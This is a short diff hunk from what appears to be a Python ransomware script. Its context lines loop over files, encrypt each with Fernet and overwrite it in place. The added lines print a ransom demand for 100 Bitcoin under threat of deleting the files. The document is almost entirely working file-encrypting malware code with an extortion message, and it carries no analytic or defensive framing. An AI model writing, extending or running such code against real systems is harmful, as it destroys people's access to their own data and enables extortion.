@@ -22,3 +22,5 @@ for file in files:
     contents_encrypted = Fernet(key).encrypt(contents)
     with open(file,"wb") as thefile:
         thefile.write(contents_encrypted)
+
+print("All of your files have been encrypted!! Send me 100 Bitcoin or I'll deleted them!")
